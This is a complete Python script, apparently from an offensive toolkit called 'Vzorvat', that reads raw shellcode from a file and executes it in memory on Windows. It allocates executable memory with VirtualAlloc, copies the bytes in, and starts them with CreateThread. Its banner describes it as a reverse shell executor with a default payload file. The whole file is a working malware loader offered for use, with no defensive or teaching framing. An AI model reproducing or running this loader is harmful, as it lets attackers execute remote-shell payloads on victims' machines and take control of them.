#!/usr/bin/env python3
import os
import sys
import ctypes
import platform

def run(bin_file):
    print(f"[+] Loading shellcode from: {bin_file}")
    with open(bin_file, 'rb') as f:
        sc = f.read()
    print(f"[+] Loaded {len(sc)} bytes")
    
    print("[+] Setting up memory for execution")
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.CreateThread.argtypes = (
        ctypes.c_int, ctypes.c_int, ctypes.c_void_p, 
        ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int)
    )
    
    print("[+] Allocating memory")
    mem = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(sc)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40)
    )
    
    print("[+] Copying shellcode to memory")
    buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(mem), 
        buf, 
        ctypes.c_int(len(sc))
    )
    
    print("[+] Creating execution thread")
    h = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_void_p(mem),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    
    print("[+] Waiting for execution to complete")
    ctypes.windll.kernel32.WaitForSingleObject(
        h, 
        ctypes.c_uint32(0xffffffff)
    )
    print("[+] Execution finished")

if __name__ == "__main__":
    print("[+] Vzorvat x64 Windows Reverse Shell Executor")
    if len(sys.argv) == 1:
        bin_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vzorvat.bin")
        if not os.path.exists(bin_file):
            print("[-] Error: vzorvat.bin not found")
            print("    Usage: python vzorvat_exec.py [shellcode.bin]")
            sys.exit(1)
        print("[+] Using default payload: vzorvat.bin")
    else:
        bin_file = sys.argv[1]
        if not os.path.exists(bin_file):
            print(f"[-] Error: File not found: {bin_file}")
            sys.exit(1)
    
    if platform.system() != "Windows":
        print("[-] Error: This script only works on Windows")
        sys.exit(1)
        
    try:
        run(bin_file)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
